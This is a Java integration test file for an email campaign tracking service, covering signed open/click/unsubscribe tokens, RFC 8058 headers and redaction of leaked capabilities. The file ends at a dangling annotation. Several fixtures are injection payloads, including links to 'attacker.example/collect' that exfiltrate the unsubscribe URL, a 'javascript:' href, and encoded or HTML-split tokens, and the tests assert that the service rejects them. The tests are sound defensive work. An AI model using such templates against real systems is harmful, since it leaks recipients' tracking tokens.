package com.camel_hub.advertisement.campaign.tracking;

import com.camel_hub.advertisement.campaign.CampaignRepository;
import com.camel_hub.advertisement.campaign.CampaignService;
import com.camel_hub.advertisement.campaign.PersonalizationProperties;
import com.camel_hub.advertisement.campaign.delivery.CampaignDeliveryRepository;
import com.camel_hub.advertisement.campaign.delivery.CampaignOutboundPreparer;
import com.camel_hub.advertisement.campaign.safety.CampaignSafetySigner;
import com.camel_hub.advertisement.common.api.PageResponse;
import com.camel_hub.advertisement.email.tracking.MailClickController;
import com.camel_hub.advertisement.email.tracking.MailOpenClassifier;
import com.camel_hub.advertisement.email.tracking.MailOpenController;
import com.camel_hub.advertisement.email.tracking.MailTrackingProperties;
import com.camel_hub.advertisement.email.tracking.MailTrackingSigner;
import com.camel_hub.advertisement.email.tracking.MailTrackingService;
import com.camel_hub.advertisement.identity.service.AuthenticationRequestContext;
import com.fasterxml.jackson.databind.ObjectMapper;
import org.jsoup.Jsoup;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.api.extension.ExtendWith;
import org.springframework.boot.test.system.CapturedOutput;
import org.springframework.boot.test.system.OutputCaptureExtension;
import org.springframework.http.HttpHeaders;
import org.springframework.test.web.reactive.server.WebTestClient;

import java.net.URI;
import java.nio.charset.StandardCharsets;
import java.time.Clock;
import java.time.Duration;
import java.time.Instant;
import java.time.ZoneId;
import java.time.ZoneOffset;
import java.util.ArrayList;
import java.util.List;
import java.util.Map;
import java.util.UUID;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.Future;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicReference;

import static org.assertj.core.api.Assertions.assertThat;
import static org.assertj.core.api.Assertions.assertThatThrownBy;

@ExtendWith(OutputCaptureExtension.class)
class CampaignTrackingApiIntegrationTest extends CampaignTrackingDatabaseTestSupport {

	private static final AuthenticationRequestContext REQUEST =
			new AuthenticationRequestContext("198.51.100.20", "Research Browser", "campaign-track-1");

	@Test
	void preparationFreezesOpaqueCallbacksAndRfc8058HeadersBeforeSmtp() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
				"<p>Personalized note</p><a href=\"https://papers.example.org/abs/42\">Paper</a>"
						+ "<a href=\"{{unsubscribe_url}}\">Unsubscribe</a>",
				"Personalized note\nUnsubscribe: {{unsubscribe_url}}");

		var first = service.prepare(claim).block();
		var second = service.prepare(claim).block();

		assertThat(second).isEqualTo(first);
		assertThat(first.subject()).isEqualTo("Personal research note");
		assertThat(first.html()).doesNotContain("{{unsubscribe_url}}")
				.contains("https://tracking.example.test/t/o/", "https://tracking.example.test/t/c/",
						"https://tracking.example.test/u/")
				.doesNotContain("attacker.example");
		assertThat(first.text()).doesNotContain("{{unsubscribe_url}}")
				.contains("https://tracking.example.test/u/");
		assertThat(first.headers()).containsEntry("List-Unsubscribe-Post", "List-Unsubscribe=One-Click")
				.containsEntry("List-Unsubscribe", "<" + unsubscribeUrl(first.text()) + ">");
		assertThat(count("tracking_tokens")).isEqualTo(3);
		assertThat(count("campaign_links")).isEqualTo(1);
		assertThat(Jsoup.parseBodyFragment(first.html()).select("img[src*='/t/o/']")).hasSize(1);
		assertThat(Jsoup.parseBodyFragment(first.html()).select("a[href*='/t/c/']")).hasSize(1);
		assertThat(Jsoup.parseBodyFragment(first.html()).select("a[href*='/u/']")).hasSize(1);
		assertThat(text("SELECT rendered_html FROM campaign_recipients WHERE id = '" + claim.recipientId() + "'"))
				.isEqualTo(first.html());
		assertThat(text("SELECT to_jsonb(t)::text FROM tracking_tokens t WHERE token_type = 'OPEN'"))
				.doesNotContain(openToken(first.html()), unsubscribeToken(first.text()));
	}

	@Test
	void initialPreparationRejectsEveryPreloadedCampaignOrTestMailCapabilityBeforeCreatingArtifacts() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim source = preparedClaim(service);
		String sourceHtml = text("SELECT rendered_html FROM campaign_recipients WHERE id = '"
				+ source.recipientId() + "'");
		String sourceText = text("SELECT rendered_text FROM campaign_recipients WHERE id = '"
				+ source.recipientId() + "'");
		MailTrackingSigner testMailSigner = new MailTrackingSigner(TRACKING_KEY);
		String testMailOpen = testMailSigner.issue(UUID.randomUUID(), NOW.plusSeconds(3_600));
		String testMailClick = testMailSigner.issueClick(
				UUID.randomUUID(), UUID.randomUUID(), NOW.plusSeconds(3_600));
		CampaignSafetySigner safetySigner = new CampaignSafetySigner(TRACKING_KEY);
		String safetyOpen = safetySigner.issueOpen(UUID.randomUUID(), NOW.plusSeconds(3_600));
		String safetyClick = safetySigner.issueClick(
				UUID.randomUUID(), UUID.randomUUID(), NOW.plusSeconds(3_600));
		String safetyUnsubscribe = safetySigner.issueUnsubscribe(UUID.randomUUID(), NOW.plusSeconds(3_600));
		String compatibilityEncodedSafetyOpen = compatibilityPercentEncoded(safetyOpen);
		String wrappedTestMailOpen = "X" + testMailOpen;
		List<PreloadedCapability> cases = List.of(
				new PreloadedCapability(
						"subject campaign open",
						"Subject https://tracking.example.test/t/o/" + openToken(sourceHtml),
						"<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"HTML attribute campaign click", "Subject",
						"<p data-capability=\"https://tracking.example.test/t/c/" + clickToken(sourceHtml)
								+ "\">Body</p><a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"HTML body campaign unsubscribe", "Subject",
						"<p>https://tracking.example.test/u/" + unsubscribeToken(sourceText)
								+ "</p><a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"plain text test-mail open", "Subject",
						"<a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Track https://tracking.example.test/t/o/" + testMailOpen + "\nStop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"HTML href test-mail click", "Subject",
						"<a href=\"https://tracking.example.test/t/c/" + testMailClick
								+ "\">Injected</a><a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"nested percent-encoded HTML attribute test-mail open", "Subject",
						"<p data-capability=\"https://tracking.example.test%252Ft%252Fo%252F" + testMailOpen
								+ "\">Body</p><a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"HTML-entity encoded body campaign click", "Subject",
						"<p>https://tracking.example.test&#x2F;t&#x2F;c&#x2F;" + clickToken(sourceHtml)
								+ "</p><a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"subject bare safety open", "Subject " + safetyOpen,
						"<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"HTML bare safety click", "Subject",
						"<p data-capability=\"" + safetyClick + "\">Body</p>"
								+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"encoded plain safety unsubscribe", "Subject",
						"<a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Injected " + safetyUnsubscribe.replace(":", "%3A") + " Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"compatibility-percent encoded safety open", "Subject " + compatibilityEncodedSafetyOpen,
						"<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"wrapped bare test-mail open", "Subject " + wrappedTestMailOpen,
						"<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"HTML span-split safety open", "Subject",
						"<p>campaign-safety-open:<span>"
								+ safetyOpen.substring("campaign-safety-open:".length())
								+ "</span></p><a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"HTML comment-split safety click", "Subject",
						"<p>campaign-safety-click:<!-- split -->"
								+ safetyClick.substring("campaign-safety-click:".length())
								+ "</p><a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Stop {{unsubscribe_url}}"));

		for (PreloadedCapability candidate : cases) {
			CampaignDeliveryRepository.ProductionClaim claim = insertClaim(candidate.html(), candidate.text());
			database.sql("UPDATE campaign_recipients SET rendered_subject = :subject WHERE id = :recipient")
					.bind("subject", candidate.subject()).bind("recipient", claim.recipientId())
					.fetch().rowsUpdated().block();

			assertThatThrownBy(() -> service.prepare(claim).block())
					.as(candidate.name()).isInstanceOf(IllegalArgumentException.class)
					.hasMessageNotContaining(openToken(sourceHtml))
					.hasMessageNotContaining(clickToken(sourceHtml))
					.hasMessageNotContaining(unsubscribeToken(sourceText))
					.hasMessageNotContaining(testMailOpen)
					.hasMessageNotContaining(testMailClick)
					.hasMessageNotContaining(safetyOpen)
					.hasMessageNotContaining(safetyClick)
					.hasMessageNotContaining(safetyUnsubscribe);
			assertThat(longValue("SELECT count(*) FROM tracking_tokens WHERE campaign_recipient_id = '"
					+ claim.recipientId() + "'")).as(candidate.name()).isZero();
			assertThat(longValue("SELECT count(*) FROM campaign_links WHERE campaign_id = '"
					+ claim.campaignId() + "'")).as(candidate.name()).isZero();
		}
	}

	@Test
	void initialPreparationRejectsEveryPlaceholderContextThatCouldExfiltrateTheUnsubscribeCapability() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		List<PreloadedCapability> cases = List.of(
				new PreloadedCapability(
						"HTML query attribute", "Subject",
						"<a href=\"https://attacker.example/collect?next={{unsubscribe_url}}\">Leak</a>"
								+ "<a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"HTML javascript attribute", "Subject",
						"<a href=\"javascript:{{unsubscribe_url}}\">Leak</a>"
								+ "<a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"HTML auto-linked body text", "Subject",
						"<p>https://attacker.example/collect?next={{unsubscribe_url}}</p>"
								+ "<a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"plain text nested query", "Subject",
						"<a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Leak https://attacker.example/collect?next={{unsubscribe_url}}\n"
								+ "Stop {{unsubscribe_url}}"),
				new PreloadedCapability(
						"plain text no-space colon label", "Subject",
						"<a href=\"{{unsubscribe_url}}\">Stop</a>",
						"Unsubscribe:{{unsubscribe_url}}"),
				new PreloadedCapability(
						"plain text colon nested URL", "Subject",
						"<a href=\"{{unsubscribe_url}}\">Stop</a>",
						"https://attacker.example/collect:{{unsubscribe_url}}"),
				new PreloadedCapability(
						"plain text parenthesis nested URL", "Subject",
						"<a href=\"{{unsubscribe_url}}\">Stop</a>",
						"https://attacker.example/collect({{unsubscribe_url}})"));

		for (PreloadedCapability candidate : cases) {
			CampaignDeliveryRepository.ProductionClaim claim = insertClaim(candidate.html(), candidate.text());

			assertThatThrownBy(() -> service.prepare(claim).block())
					.as(candidate.name()).isInstanceOf(IllegalArgumentException.class)
					.hasMessageNotContaining("attacker.example");
			assertThat(longValue("SELECT count(*) FROM tracking_tokens WHERE campaign_recipient_id = '"
					+ claim.recipientId() + "'")).as(candidate.name()).isZero();
			assertThat(longValue("SELECT count(*) FROM campaign_links WHERE campaign_id = '"
					+ claim.campaignId() + "'")).as(candidate.name()).isZero();
			assertThat(text("SELECT rendered_html FROM campaign_recipients WHERE id = '"
					+ claim.recipientId() + "'")).contains("{{unsubscribe_url}}");
		}
	}

	@Test
	void initialPreparationAndFrozenRetryAllowAStandaloneUrlInsideSpacedParentheses() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
				"<p>Personalized note</p><a href=\"{{unsubscribe_url}}\">Stop</a>",
				"Personalized note. Stop ({{unsubscribe_url}}).");

		CampaignOutboundPreparer.PreparedOutbound first = service.prepare(claim).block();
		CampaignOutboundPreparer.PreparedOutbound retry = service.prepare(claim).block();

		assertThat(retry).isEqualTo(first);
		assertThat(first.text()).contains("Stop (https://tracking.example.test/u/").endsWith(").");
		assertThat(first.headers().get("List-Unsubscribe"))
				.isEqualTo("<" + unsubscribeUrl(first.text()) + ">");
	}

	@Test
	void initialPreparationAllowsOrdinaryExternalPathsThatResembleCallbackRoutesButCarryNoCapability() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
				"<a href=\"https://papers.example.org/u/profile\">Profile</a>"
						+ "<a href=\"https://papers.example.org/t/o/article\">Article</a>"
						+ "<img src=\"https://papers.example.org/t/o/figure\" alt=\"Figure\">"
						+ "<a href=\"HTTP://papers.example.org/mixed\">Mixed case</a>"
						+ "<a href=\"https://papers.example.org/search?q=a+b&amp;ratio=100%25\">Search</a>"
						+ "<a href=\"{{unsubscribe_url}}\">Stop</a>",
				"100% effective; query q=a+b; reference https://papers.example.org/t/c/catalog\n"
						+ "Stop {{unsubscribe_url}}");

		CampaignOutboundPreparer.PreparedOutbound prepared = service.prepare(claim).block();
		CampaignOutboundPreparer.PreparedOutbound frozenRetry = service.prepare(claim).block();

		assertThat(frozenRetry).isEqualTo(prepared);
		assertThat(prepared.html()).contains("https://tracking.example.test/t/c/");
		assertThat(prepared.html()).contains("https://papers.example.org/t/o/figure");
		assertThat(prepared.html()).contains("HTTP://papers.example.org/mixed");
		assertThat(prepared.text()).contains("https://papers.example.org/t/c/catalog");
		assertThat(count("campaign_links")).isEqualTo(3);
	}

	@Test
	void frozenRetryHandlesTextPunctuationButFailsClosedAfterCallbackOriginRotation() {
		CampaignTrackingService firstService = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
				"<p data-unsubscribe=\"{{unsubscribe_url}}\">Personalized note</p>"
						+ "<a href=\"https://papers.example.org/abs/42\">Paper</a>",
				"Personalized note. Stop here: {{unsubscribe_url}}:");
		CampaignOutboundPreparer.PreparedOutbound first = firstService.prepare(claim).block();
		CampaignOutboundPreparer.PreparedOutbound sameOriginRetry = firstService.prepare(claim).block();
		MailTrackingProperties rotated = new MailTrackingProperties(
				true, "https://rotated.example.test", TRACKING_KEY, Duration.ofDays(30));
		CampaignTrackingService rotatedService = new CampaignTrackingService(
				new CampaignTrackingRepository(database), rotated, new CampaignTrackingSigner(TRACKING_KEY),
				new MailOpenClassifier(), Clock.fixed(NOW.plusSeconds(30), ZoneOffset.UTC), transactions);

		assertThat(sameOriginRetry).isEqualTo(first);
		assertThat(sameOriginRetry.headers().get("List-Unsubscribe"))
				.isEqualTo("<" + unsubscribeUrl(first.text()) + ">");
		assertThatThrownBy(() -> rotatedService.prepare(claim).block())
				.isInstanceOf(IllegalArgumentException.class)
				.hasMessageNotContaining(unsubscribeToken(first.text()))
				.hasMessageNotContaining("tracking.example.test");
		assertThat(count("tracking_tokens")).isEqualTo(3);
		assertThat(count("campaign_links")).isEqualTo(1);
	}

	@Test
	void frozenRetryRejectsAStoredSubjectContainingAnySignedOrConfiguredOriginCapability() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		for (String injectedSubject : List.of("signed", "configured-origin")) {
			CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
					"<a href=\"https://papers.example.org/abs/42\">Paper</a>"
							+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}");
			CampaignOutboundPreparer.PreparedOutbound prepared = service.prepare(claim).block();
			String capability = injectedSubject.equals("signed")
					? openToken(prepared.html()) : "https://tracking.example.test/u/not-a-token";
			database.sql("UPDATE campaign_recipients SET rendered_subject = :subject WHERE id = :recipient")
					.bind("subject", "Injected " + capability).bind("recipient", claim.recipientId())
					.fetch().rowsUpdated().block();

			assertThatThrownBy(() -> service.prepare(claim).block())
					.as(injectedSubject).isInstanceOf(IllegalArgumentException.class)
					.hasMessageNotContaining(capability);
		}
	}

	@Test
	void frozenRetryRejectsProductionSafetyAndTestMailCapabilitiesJoinedAcrossHtmlNodes() {
		CampaignTrackingSigner productionSigner = new CampaignTrackingSigner(TRACKING_KEY);
		CampaignSafetySigner safetySigner = new CampaignSafetySigner(TRACKING_KEY);
		MailTrackingSigner testMailSigner = new MailTrackingSigner(TRACKING_KEY);
		Instant expiresAt = NOW.plus(Duration.ofHours(1));
		String compatibilityEncodedSafety = compatibilityPercentEncoded(
				safetySigner.issueOpen(UUID.randomUUID(), expiresAt));
		List<PreloadedCapability> cases = List.of(
				new PreloadedCapability("compatibility-percent encoded safety open", "Subject",
						compatibilityEncodedSafety, ""),
				new PreloadedCapability("span-split safety open", "Subject",
						joinAcrossSpan(safetySigner.issueOpen(UUID.randomUUID(), expiresAt),
								"campaign-safety-open:"), ""),
				new PreloadedCapability("comment-split production click", "Subject",
						joinAcrossComment(productionSigner.issueClick(
								UUID.randomUUID(), UUID.randomUUID(), expiresAt), "campaign-click:"), ""),
				new PreloadedCapability("span-split test-mail open", "Subject",
						joinAcrossSpan(testMailSigner.issue(UUID.randomUUID(), expiresAt), "v1."), ""));

		for (PreloadedCapability candidate : cases) {
			resetDatabase();
			CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
			CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
					"<p>Personalized note</p><a href=\"https://papers.example.org/abs/42\">Paper</a>"
							+ "<a href=\"{{unsubscribe_url}}\">Stop</a>",
					"Personalized note Stop {{unsubscribe_url}}");
			CampaignOutboundPreparer.PreparedOutbound frozen = service.prepare(claim).block();
			long tokenRows = longValue("SELECT count(*) FROM tracking_tokens WHERE campaign_recipient_id = '"
					+ claim.recipientId() + "'");
			long linkRows = longValue("SELECT count(*) FROM campaign_links WHERE campaign_id = '"
					+ claim.campaignId() + "'");
			database.sql("UPDATE campaign_recipients SET rendered_html = :html WHERE id = :recipient")
					.bind("html", frozen.html() + "<p>" + candidate.html() + "</p>")
					.bind("recipient", claim.recipientId()).fetch().rowsUpdated().block();

			assertThatThrownBy(() -> service.prepare(claim).block())
					.as(candidate.name()).isInstanceOf(IllegalArgumentException.class)
					.hasMessageNotContaining("campaign-safety")
					.hasMessageNotContaining("campaign-click")
					.hasMessageNotContaining("v1.");
			assertThat(longValue("SELECT count(*) FROM tracking_tokens WHERE campaign_recipient_id = '"
					+ claim.recipientId() + "'")).as(candidate.name()).isEqualTo(tokenRows);
			assertThat(longValue("SELECT count(*) FROM campaign_links WHERE campaign_id = '"
					+ claim.campaignId() + "'")).as(candidate.name()).isEqualTo(linkRows);
		}
	}

	@Test
	void campaignRecipientReadPathRedactsACapabilityInjectedIntoAFrozenSubject() {
		CampaignTrackingService tracking = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = preparedClaim(tracking);
		String storedHtml = text("SELECT rendered_html FROM campaign_recipients WHERE id = '"
				+ claim.recipientId() + "'");
		String capability = openToken(storedHtml);
		database.sql("UPDATE campaign_recipients SET rendered_subject = :subject WHERE id = :recipient")
				.bind("subject", "Leaked " + capability).bind("recipient", claim.recipientId())
				.fetch().rowsUpdated().block();
		CampaignService campaigns = new CampaignService(new CampaignRepository(database), null,
				new PersonalizationProperties(false, "test", "test", 20), new ObjectMapper(), transactions,
				new CampaignPublicContentRedactor(TRACKING_PROPERTIES.publicBaseUrl()));

		String response = json(campaigns.recipients(claim.campaignId(), 1, 20).block());

		assertThat(response).doesNotContain(capability, "campaign-open:v1", "tracking.example.test/u/")
				.contains("\"trackingArtifactsRedacted\":true");
	}

	@Test
	void campaignRecipientReadPathFailsClosedForOverEncodedSubjectCapability() {
		CampaignTrackingService tracking = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = preparedClaim(tracking);
		String storedHtml = text("SELECT rendered_html FROM campaign_recipients WHERE id = '"
				+ claim.recipientId() + "'");
		String capability = openToken(storedHtml);
		String encoded = capability.replace(":", "%3A");
		for (int round = 1; round < 6; round++) encoded = encoded.replace("%", "%25");
		database.sql("UPDATE campaign_recipients SET rendered_subject = :subject WHERE id = :recipient")
				.bind("subject", "Encoded " + encoded).bind("recipient", claim.recipientId())
				.fetch().rowsUpdated().block();
		CampaignService campaigns = new CampaignService(new CampaignRepository(database), null,
				new PersonalizationProperties(false, "test", "test", 20), new ObjectMapper(), transactions,
				new CampaignPublicContentRedactor(TRACKING_PROPERTIES.publicBaseUrl()));

		String response = json(campaigns.recipients(claim.campaignId(), 1, 20).block());

		assertThat(response).doesNotContain(encoded, capability, "campaign-open:v1")
				.contains("\"subject\":null", "\"trackingArtifactsRedacted\":true");
	}

	@Test
	void campaignRecipientReadPathRedactsCapabilitiesFromUnfrozenGeneratedDraftBodies() {
		CampaignTrackingService tracking = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim source = preparedClaim(tracking);
		String sourceHtml = text("SELECT rendered_html FROM campaign_recipients WHERE id = '"
				+ source.recipientId() + "'");
		String campaignOpen = openToken(sourceHtml);
		String campaignClick = clickToken(sourceHtml);
		String testMailOpen = new MailTrackingSigner(TRACKING_KEY)
				.issue(UUID.randomUUID(), NOW.plus(Duration.ofHours(1)));
		CampaignSafetySigner safetySigner = new CampaignSafetySigner(TRACKING_KEY);
		String safetyOpen = safetySigner.issueOpen(UUID.randomUUID(), NOW.plus(Duration.ofHours(1)));
		String safetyClick = safetySigner.issueClick(UUID.randomUUID(), UUID.randomUUID(),
				NOW.plus(Duration.ofHours(1)));
		String safetyUnsubscribe = safetySigner.issueUnsubscribe(
				UUID.randomUUID(), NOW.plus(Duration.ofHours(1)));
		String encodedTestMailUrl = ("https://attacker.example/t/o/" + testMailOpen)
				.replace(":", "%3A").replace("/", "%2F");
		String entityCampaignUrl = "https:&#x2F;&#x2F;attacker.example&#x2F;t&#x2F;c&#x2F;"
				+ campaignClick.replace(":", "&#x3A;");
		String deepEncodedSafetyClick = safetyClick.replace(":", "%3A");
		for (int round = 0; round < 3; round++) {
			deepEncodedSafetyClick = deepEncodedSafetyClick.replace("%", "%25");
		}
		String splitCommentSafetyOpen = safetyOpen.replace("campaign-safety-open:",
				"campaign-safety-open<!--split-->:");
		String splitNodeSafetyUnsubscribe = safetyUnsubscribe.replace("campaign-safety-unsubscribe:",
				"<span>campaign-safety-</span><span>unsubscribe:</span>");
		String compatibilityEncodedSafetyOpen = compatibilityPercentEncoded(safetyOpen);
		String wrappedTestMailOpen = "X" + testMailOpen;
		List<PreloadedCapability> cases = List.of(
				new PreloadedCapability("raw campaign capability", "Safe subject",
						"<p data-secret=\"" + campaignOpen + "\">Draft</p>", "Safe text"),
				new PreloadedCapability("percent-encoded test-mail capability", "Safe subject",
						"<p>Safe HTML</p>", "Draft " + encodedTestMailUrl),
				new PreloadedCapability("HTML-entity encoded campaign capability", "Safe subject",
						"<p>Draft " + entityCampaignUrl + "</p>", "Safe text"),
				new PreloadedCapability("raw safety capability", "Safe subject",
						"<p data-secret=\"" + safetyOpen + "\">Draft</p>", "Safe text"),
				new PreloadedCapability("raw safety click capability", "Safe subject",
						"<p data-secret=\"" + safetyClick + "\">Draft</p>", "Safe text"),
				new PreloadedCapability("entity-encoded safety capability", "Safe subject",
						"<p data-secret=\"" + safetyOpen.replace(":", "&#58;") + "\">Draft</p>", "Safe text"),
				new PreloadedCapability("deep percent-encoded safety capability", "Safe subject",
						"<p>Safe HTML</p>", "Draft " + deepEncodedSafetyClick),
				new PreloadedCapability("comment-split safety capability", "Safe subject",
						"<p>" + splitCommentSafetyOpen + "</p>", "Safe text"),
				new PreloadedCapability("node-split safety capability", "Safe subject",
						"<p>" + splitNodeSafetyUnsubscribe + "</p>", "Safe text"),
				new PreloadedCapability("NFKC safety capability", "Safe subject",
						"<p>Safe HTML</p>", "Draft " + fullWidthAscii(safetyUnsubscribe)),
				new PreloadedCapability("compatibility-percent encoded safety capability", "Safe subject",
						"<p>Safe HTML</p>", "Draft " + compatibilityEncodedSafetyOpen),
				new PreloadedCapability("wrapped bare test-mail capability", "Safe subject",
						"<p>Safe HTML</p>", "Draft " + wrappedTestMailOpen));

		for (PreloadedCapability candidate : cases) {
			CampaignDeliveryRepository.ProductionClaim draft = insertClaim(candidate.html(), candidate.text());
			database.sql("""
					UPDATE campaign_recipients
					SET status = 'QUEUED', attempt_count = 0, rendered_subject = :subject,
					    delivery_lease_hash = NULL, delivery_lease_expires_at = NULL
					WHERE id = :recipient
					""").bind("subject", candidate.subject()).bind("recipient", draft.recipientId())
					.fetch().rowsUpdated().block();
			database.sql("DELETE FROM delivery_attempts WHERE campaign_recipient_id = :recipient")
					.bind("recipient", draft.recipientId()).fetch().rowsUpdated().block();
			CampaignService campaigns = new CampaignService(new CampaignRepository(database), null,
					new PersonalizationProperties(false, "test", "test", 20), new ObjectMapper(), transactions,
					new CampaignPublicContentRedactor(TRACKING_PROPERTIES.publicBaseUrl()));

			String response = json(campaigns.recipients(draft.campaignId(), 1, 20).block());

			assertThat(response).as(candidate.name())
					.doesNotContain(candidate.html(), candidate.text(), campaignOpen, campaignClick,
							testMailOpen, safetyOpen, safetyClick, safetyUnsubscribe,
							encodedTestMailUrl, entityCampaignUrl, deepEncodedSafetyClick,
							splitCommentSafetyOpen, splitNodeSafetyUnsubscribe, fullWidthAscii(safetyUnsubscribe),
							compatibilityEncodedSafetyOpen, wrappedTestMailOpen)
					.contains("\"subject\":\"Safe subject\"", "\"html\":null", "\"text\":null",
							"\"trackingArtifactsRedacted\":true");
			assertThat(longValue("SELECT count(*) FROM tracking_tokens WHERE campaign_recipient_id = '"
					+ draft.recipientId() + "'")).as(candidate.name()).isZero();
		}
	}

	@Test
	void campaignRecipientReadPathRedactsRawDeepEncodedAndNfkcSafetyCapabilitiesFromDraftSubjects() {
		CampaignSafetySigner safetySigner = new CampaignSafetySigner(TRACKING_KEY);
		String token = safetySigner.issueUnsubscribe(UUID.randomUUID(), NOW.plus(Duration.ofHours(1)));
		String encoded = token.replace(":", "%3A");
		for (int round = 0; round < 3; round++) encoded = encoded.replace("%", "%25");
		for (String subject : List.of(token, encoded, fullWidthAscii(token))) {
			CampaignDeliveryRepository.ProductionClaim draft = insertClaim(
					"<p>Safe HTML</p><a href=\"{{unsubscribe_url}}\">Stop</a>",
					"Safe text {{unsubscribe_url}}");
			database.sql("UPDATE campaign_recipients SET status = 'QUEUED', attempt_count = 0, "
					+ "rendered_subject = :subject, delivery_lease_hash = NULL, delivery_lease_expires_at = NULL "
					+ "WHERE id = :recipient")
					.bind("subject", subject).bind("recipient", draft.recipientId())
					.fetch().rowsUpdated().block();
			database.sql("DELETE FROM delivery_attempts WHERE campaign_recipient_id = :recipient")
					.bind("recipient", draft.recipientId()).fetch().rowsUpdated().block();
			CampaignService campaigns = new CampaignService(new CampaignRepository(database), null,
					new PersonalizationProperties(false, "test", "test", 20), new ObjectMapper(), transactions,
					new CampaignPublicContentRedactor(TRACKING_PROPERTIES.publicBaseUrl()));

			String response = json(campaigns.recipients(draft.campaignId(), 1, 20).block());

			assertThat(response).doesNotContain(subject, token)
					.contains("\"subject\":null", "\"trackingArtifactsRedacted\":true");
		}
	}

	@Test
	void frozenRetryFailsClosedWhenAnyStoredCapabilityOrDurableDigestIsCorrupted() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
				"<a href=\"https://papers.example.org/abs/42\">Paper</a>"
						+ "<a href=\"{{unsubscribe_url}}\">Stop</a>",
				"Stop {{unsubscribe_url}}");
		CampaignOutboundPreparer.PreparedOutbound prepared = service.prepare(claim).block();
		String click = clickToken(prepared.html());
		String corrupted = click.substring(0, click.length() - 1) + (click.endsWith("A") ? "B" : "A");
		database.sql("UPDATE campaign_recipients SET rendered_html = replace(rendered_html, :valid, :bad) WHERE id = :id")
				.bind("valid", click).bind("bad", corrupted).bind("id", claim.recipientId())
				.fetch().rowsUpdated().block();

		assertThatThrownBy(() -> service.prepare(claim).block())
				.isInstanceOf(IllegalArgumentException.class)
				.hasMessageNotContaining(click)
				.hasMessageNotContaining(corrupted);
		assertThat(count("tracking_tokens")).isEqualTo(3);
		assertThat(count("campaign_links")).isEqualTo(1);
	}

	@Test
	void frozenRetryRejectsTrailingPunctuationInsideEveryHtmlCapabilityAttribute() {
		CampaignTrackingService service = service(Clock.fixed(NOW, ZoneOffset.UTC));
		for (String type : List.of("OPEN", "CLICK", "UNSUBSCRIBE")) {
			CampaignDeliveryRepository.ProductionClaim claim = insertClaim(
					"<a href=\"https://papers.example.org/abs/42\">Paper</a>"
							+ "<a href=\"{{unsubscribe_url}}\">Stop</a>", "Stop {{unsubscribe_url}}");
			CampaignOutboundPreparer.PreparedOutbound prepared = service.prepare(claim).block();
			String capability = switch (type) {
				case "OPEN" -> openUrl(prepared.html());
				case "CLICK" -> clickUrl(prepared.html());
				case "UNSUBSCRIBE" -> unsubscribeUrl(prepared.text());
				default -> throw new IllegalStateException();
			};
			database.sql("UPDATE campaign_recipients SET rendered_html = replace(rendered_html, :valid, :bad) "
						+ "WHERE id = :recipient")
					.bind("valid", capability).bind("bad", capability + ".").bind("recipient", claim.recipientId())
					.fetch().rowsUpdated().block();

			assertThatThrownBy(() -> service.prepare(claim).block())
					.as(type).isInstanceOf(IllegalArgumentException.class)
					.hasMessageNotContaining(capability);
		}
	}

	@Test
